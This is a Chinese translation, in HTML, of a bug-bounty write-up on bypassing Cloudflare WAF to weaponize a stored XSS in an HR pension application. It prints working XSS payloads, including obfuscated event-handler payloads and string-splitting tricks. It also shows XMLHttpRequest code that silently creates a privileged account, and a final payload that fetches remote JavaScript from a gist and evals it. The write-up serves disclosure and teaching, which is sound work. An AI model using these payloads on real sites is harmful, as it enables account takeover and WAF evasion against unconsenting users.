<html>
<head>
<title>Bypassing WAF to Weaponize a Stored XSS</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">绕过WAF将储存的XSS武器化</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/bypassing-waf-to-weaponize-a-stored-xss-ff9963c421ee?source=collection_archive---------0-----------------------#2022-05-17">https://infosecwriteups.com/bypassing-waf-to-weaponize-a-stored-xss-ff9963c421ee?source=collection_archive---------0-----------------------#2022-05-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b58a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在测试一个bug bounty程序的时候，我注意到我的<code class="fe kl km kn ko b">&lt;u&gt;html injection&lt;/u&gt;</code>有效载荷在喷洒到应用程序中反映的每一个字段的时候都在工作。然后，我第一次想用<code class="fe kl km kn ko b">&lt;img src=x onerror=alert()&gt;</code>得到提醒的冲动失败了。<code class="fe kl km kn ko b">Alert()</code>被cloudflare WAF挡住了。于是，我用了<code class="fe kl km kn ko b">console.log()</code>，它被接受并执行。当我必须构建一个PoC来显示这个XSS会影响其他用户时，问题就出现了。</p><h2 id="95ce" class="kp kq iq bd kr ks kt dn ku kv kw dp kx jy ky kz la kc lb lc ld kg le lf lg lh bi translated">关于目标</h2><p id="904a" class="pw-post-body-paragraph jn jo iq jp b jq li js jt ju lj jw jx jy lk ka kb kc ll ke kf kg lm ki kj kk ij bi translated">这个应用程序是为人力资源部门管理雇员的养老金而构建的。员工自己无法访问该应用程序。唯一的授权差异发生在主HR帐户和子HR帐户之间。</p><p id="9a9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">子HR账户存在2个权限级别。</p><pre class="ln lo lp lq gt lr ko ls lt aw lu bi"><span id="55fb" class="kp kq iq ko b gy lv lw l lx ly">1. Read-Only Access<br/>2. Standard Access</span></pre><p id="d980" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">具有标准访问权限的子HR帐户可以创建、编辑和删除员工记录。但是，它不能创建新的子HR帐户。只有main-HR帐户才允许这样做。</p><p id="040e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在我们的攻击场景中，我们有一个下级HR帐户。我们将员工姓名编辑到XSS有效载荷中，该载荷将被存储。我们的受害者，一个main-HR帐户访问了<code class="fe kl km kn ko b">Income Decl.</code>选项卡，导致我们的有效负载的执行。其向<code class="fe kl km kn ko b">/hrusers/add</code>发出<code class="fe kl km kn ko b">POST</code>请求以创建新的子HR账户。</p><p id="3952" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是XSS被处决的那一页。根据他们的要求，公司的信息被修改了。</p><figure class="ln lo lp lq gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi lz"><img src="../Images/ab88047f9e0de5fe688f3b6fbefde3eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6kgnDwcN7AcF68lFju-kNw.png"/></div></div></figure><h1 id="1828" class="mh kq iq bd kr mi mj mk ku ml mm mn kx mo mp mq la mr ms mt ld mu mv mw lg mx bi translated">剥削</h1><p id="1b89" class="pw-post-body-paragraph jn jo iq jp b jq li js jt ju lj jw jx jy lk ka kb kc ll ke kf kg lm ki kj kk ij bi translated"><code class="fe kl km kn ko b">POST /hrusers/add</code>其核心最初看起来是这样的(为了增加可读性，删除了一些标题):</p><pre class="ln lo lp lq gt lr ko ls lt aw lu bi"><span id="4085" class="kp kq iq ko b gy lv lw l lx ly">POST /hrusers/add HTTP/1.1<br/>Host: www.app.tld<br/>Cookie: auth=secret;<br/>Content-Length: 976<br/>Origin: https://www.app.tld<br/>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Sec-Fetch-Site: same-origin<br/>Sec-Fetch-Mode: navigate<br/>Sec-Fetch-User: ?1<br/>Sec-Fetch-Dest: document<br/>Referer: https://www.app.tld/<br/>Connection: close</span><span id="19f7" class="kp kq iq ko b gy my lw l lx ly">------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="_method"</span><span id="8986" class="kp kq iq ko b gy my lw l lx ly">POST<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][first_name]"</span><span id="959f" class="kp kq iq ko b gy my lw l lx ly">john<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][last_name]"</span><span id="5a7e" class="kp kq iq ko b gy my lw l lx ly">doe<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][email_address]"</span><span id="4ef2" class="kp kq iq ko b gy my lw l lx ly">ne555+blog@wearehackerone.com<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][username]"</span><span id="a1a9" class="kp kq iq ko b gy my lw l lx ly">ne555-blog<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][password]"</span><span id="534b" class="kp kq iq ko b gy my lw l lx ly">testpass123!<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][conf_password]"</span><span id="4d7f" class="kp kq iq ko b gy my lw l lx ly">testpass123!<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g<br/>Content-Disposition: form-data; name="data[User][role_type]"</span><span id="8b1d" class="kp kq iq ko b gy my lw l lx ly">0<br/>------WebKitFormBoundarycItg8YvLxAC5Af6g--</span></pre><p id="7fa9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe kl km kn ko b">302 Found</code>请求成功后返回。</p><ol class=""><li id="dcfb" class="mz na iq jp b jq jr ju jv jy nb kc nc kg nd kk ne nf ng nh bi translated">我尝试的第一件事是使用<code class="fe kl km kn ko b">script</code>标签，但它被cloudflare阻止了。</li></ol><figure class="ln lo lp lq gt ma gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi lz"><img src="../Images/05fe2a143820c9c8190b807a534db724.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZUxEskNve3AVDMUi5Oyu2A.png"/></div></div></figure><p id="7b49" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.我试图绕过解析，但是没有什么好的结果。所以我需要在事件处理程序中构建有效负载。</p><p id="5292" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.我试着创造了一个<code class="fe kl km kn ko b">XMLHttpRequest</code>。然而，它也被阻止了。<br/> <code class="fe kl km kn ko b">&lt;img src=x onerror="poc = new XMLHttpRequest()"&gt;</code></p><p id="2623" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.在制作了几个有效载荷之后，我意识到这种开发不会像我想象的那么简单。CSP规则允许我从任何域获取数据。因此，如果我将恶意javascript存储在其他地方，并在运行时取出，WAF将无法检测到它。</p><p id="cee1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.<code class="fe kl km kn ko b">fetch()</code>被屏蔽。所以我开始寻找编码的方法。很早就想用<a class="ae ni" href="https://aem1k.com/aurebesh.js/" rel="noopener ugc nofollow" target="_blank"> aurebesh.js </a>了。这似乎是一个很好的用例。这是全部有效载荷:</p><pre class="ln lo lp lq gt lr ko ls lt aw lu bi"><span id="edeb" class="kp kq iq ko b gy lv lw l lx ly">&lt;img src=x onerror="a='',b=!a+a,aa=!b+a,ab=a+{},ba=b[a++],bb=b[baa=a],bab=++baa+a,aaa=ab[baa+bab],b[aaa+=ab[a]+(b.aa+ab)[a]+aa[bab]+ba+bb+b[baa]+aaa+ba+ab[a]+bb][aaa](aa[a]+aa[baa]+b[bab]+bb+ba+'(a)')()"&gt;</span></pre><p id="1710" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.WAF没有阻止它，并弹出一个警报。也许我可以这样编码<code class="fe kl km kn ko b">fetch()</code>。我试过jsfuck.com，但是WAF挡住了我的有效载荷。这很奇怪。也许我可以编写自己的aurebesh.js版本，让我可以对任何代码使用任何字母。</p><p id="1167" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.在从事这项工作一段时间后，很明显我的JS知识远远低于标准。我需要找到其他方法绕过这个晶片。</p><p id="c172" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.<a class="ae ni" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" rel="noopener ugc nofollow" target="_blank"> PayloadsAllTheThings </a>回购真的很有帮助，我发现<code class="fe kl km kn ko b">top["al"+"ert"](1);</code> payload确实起作用了。我可以偷偷加入像这样危险的函数。</p><p id="e04c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.如果我能把<code class="fe kl km kn ko b">POST /hrusers/add</code>请求中的<code class="fe kl km kn ko b">multipart/form-data</code>变成<code class="fe kl km kn ko b">application/x-www-form-urlencoded</code>，我就不用处理边界了。我这样做了，尽管Burp Suite的<code class="fe kl km kn ko b">change body encoding</code>功能和服务器接受了请求。</p><p id="4758" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">10.我用下面的代码创建了一个要点。</p><pre class="ln lo lp lq gt lr ko ls lt aw lu bi"><span id="b32f" class="kp kq iq ko b gy lv lw l lx ly">body = `_method=POST&amp;data%5bUser%5d%5bfirst_name%5d=john&amp;data%5bUser%5d%5blast_name%5d=doe&amp;data%5bUser%5d%5bemail_address%5d=ne555%2bblog@wearehackerone.com&amp;data%5bUser%5d%5busername%5d=ne555-blog&amp;data%5bUser%5d%5bpassword%5d=testpass123%21&amp;data%5bUser%5d%5bconf_password%5d=testpass123%21&amp;data%5bUser%5d%5brole_type%5d=0`;<br/>poc = new XMLHttpRequest();<br/>poc.open(`POST`,`/hrusers/add`, true);<br/>poc.setRequestHeader(`Content-Type`, `application/x-www-form-urlencoded`);<br/>poc.withCredentials = true;<br/>poc.send(body);</span></pre><p id="6b32" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">11.现在我必须获取这个javascript并使用<code class="fe kl km kn ko b">eval()</code>执行它。有效载荷的创建是有问题的，因为它在一个事件处理器内部，并且由许多层组成。gist中的所有字符串都必须使用撇号创建。</p><p id="e706" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">12.最终有效载荷:</p><pre class="ln lo lp lq gt lr ko ls lt aw lu bi"><span id="8a64" class="kp kq iq ko b gy lv lw l lx ly">&lt;img src="x" onerror="top[`fet`+`ch`]('https://gist.githubusercontent.com/Hubbey/84d413e76dd833b42eb0281b9d7191fa/raw/e08425e18d85b10e82dc6ba4bc25b0df08321000/blog').then(response =&gt;response.text()).then((body) =&gt;{top[`ev`+`al`](body);})"&gt;</span></pre><p id="d77f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">13.现在，当受害者访问该页面时，会创建一个新的子HR帐户。</p><h2 id="0e4c" class="kp kq iq bd kr ks kt dn ku kv kw dp kx jy ky kz la kc lb lc ld kg le lf lg lh bi translated">结论</h2><p id="43b8" class="pw-post-body-paragraph jn jo iq jp b jq li js jt ju lj jw jx jy lk ka kb kc ll ke kf kg lm ki kj kk ij bi translated">事实证明，不仅仅是证明XSS在工作，还真的很有教育意义。这个漏洞存在于一个私人的bug赏金程序中。所以，它得到了奖励，这篇博文被公司允许了。</p></div></div>    
</body>
</html>